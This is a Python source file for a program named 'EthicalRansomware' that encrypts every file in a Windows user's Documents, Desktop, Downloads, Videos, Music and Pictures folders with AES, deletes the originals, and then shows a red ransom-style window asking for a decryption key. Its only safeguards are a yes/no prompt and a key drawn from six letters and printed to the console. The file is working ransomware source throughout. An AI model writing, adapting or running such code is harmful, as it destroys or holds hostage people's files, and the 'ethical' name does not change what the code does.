import os
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import random
import hashlib

class EthicalRansomware:
    def __init__(self, show_hash=False):
        self.show_hash = show_hash

        # Predefined decryption keys
        self.decryption_keys = ['a', 'b', 'c', 'd', 'e', 'f']

        # Randomly pick a decryption key for this session
        self.selected_key = random.choice(self.decryption_keys)

        # If show_hash is True, print the key to the console
        if self.show_hash:
            print(f"Selected Key: {self.selected_key}")

        # Generate AES key based on the selected key
        self.key = hashlib.sha256(self.selected_key.encode()).digest()

    def encrypt_file(self, file_path):
        """Encrypt a file and delete the original."""
        try:
            # Skip already encrypted files
            if file_path.endswith('.enc'):
                return

            with open(file_path, 'rb') as f:
                data = f.read()

            # Pad the data to be a multiple of AES block size
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()

            # Generate a random IV for encryption
            iv = os.urandom(16)
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

            # Save the IV and encrypted data to a new file
            encrypted_file_path = file_path + '.enc'
            with open(encrypted_file_path, 'wb') as f:
                f.write(iv + encrypted_data)

            # Delete the original file
            os.remove(file_path)
            print(f"Encrypted: {file_path} -> {encrypted_file_path}")

        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")

    def decrypt_file(self, file_path, user_key):
        """Decrypt a file using the provided key."""
        try:
            # Validate user key
            if user_key != self.selected_key:
                messagebox.showerror("Decryption Failed", "Incorrect key!")
                return

            with open(file_path, 'rb') as f:
                iv = f.read(16)  # Extract the IV
                encrypted_data = f.read()

            cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

            # Unpad the decrypted data
            unpadder = padding.PKCS7(128).unpadder()
            decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

            # Save decrypted data to a file
            decrypted_file_path = file_path.replace('.enc', '')
            with open(decrypted_file_path, 'wb') as f:
                f.write(decrypted_data)

            # Delete the encrypted file
            os.remove(file_path)
            print(f"Decrypted: {file_path} -> {decrypted_file_path}")

        except Exception as e:
            print(f"Failed to decrypt {file_path}: {e}")

    def is_system_file(self, file_path):
        """Check if the file is a critical system file."""
        system_paths = [
            "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
            "C:\\System Volume Information", "C:\\$Recycle.Bin", "C:\\Users\\Default"
        ]
        for path in system_paths:
            if file_path.startswith(path):
                return True
        return False

    def get_user_folders(self):
        """Get user directories to encrypt."""
        user_dirs = [
            os.path.join(os.environ["USERPROFILE"], "Documents"),
            os.path.join(os.environ["USERPROFILE"], "Desktop"),
            os.path.join(os.environ["USERPROFILE"], "Downloads"),
            os.path.join(os.environ["USERPROFILE"], "Videos"),
            os.path.join(os.environ["USERPROFILE"], "Music"),
            os.path.join(os.environ["USERPROFILE"], "Pictures")
        ]
        return user_dirs

    def traverse_and_encrypt(self, start_path):
        """Traverse directories and encrypt files."""
        for root, _, files in os.walk(start_path):
            for file in files:
                file_path = os.path.join(root, file)
                if not self.is_system_file(file_path) and not file.endswith('.enc'):
                    self.encrypt_file(file_path)

    def traverse_and_decrypt(self, start_path, user_key):
        """Traverse directories and decrypt files."""
        for root, _, files in os.walk(start_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file.endswith('.enc'):
                    self.decrypt_file(file_path, user_key)


# GUI Setup
def ransomware_gui():
    def decrypt_action():
        user_key = decryption_key_entry.get()
        if user_key:
            for folder in ransomware.get_user_folders():
                ransomware.traverse_and_decrypt(folder, user_key)
            messagebox.showinfo("Success", "Decryption Complete!")
        else:
            messagebox.showerror("Error", "Enter a decryption key.")

    if messagebox.askyesno("Ransomware Warning", "Are you sure you want to proceed?"):
        global ransomware
        ransomware = EthicalRansomware(show_hash=True)

        # Encrypt files immediately
        for folder in ransomware.get_user_folders():
            ransomware.traverse_and_encrypt(folder)

        # Set up GUI
        root = tk.Tk()
        root.title("Your Files are Encrypted!")
        root.geometry("800x600")
        root.configure(bg="red")

        label = tk.Label(root, text="All your files are encrypted.\nEnter the correct key to decrypt them.",
                         font=("Arial", 20), bg="red", fg="white", wraplength=700, justify="center")
        label.pack(pady=50)

        decryption_key_label = tk.Label(root, text="Enter Key:", font=("Arial", 16), bg="red", fg="white")
        decryption_key_label.pack()

        decryption_key_entry = tk.Entry(root, font=("Arial", 16))
        decryption_key_entry.pack(pady=10)

        decrypt_button = tk.Button(root, text="Decrypt", font=("Arial", 16), command=decrypt_action)
        decrypt_button.pack(pady=20)

        root.mainloop()


if __name__ == "__main__":
    ransomware_gui()
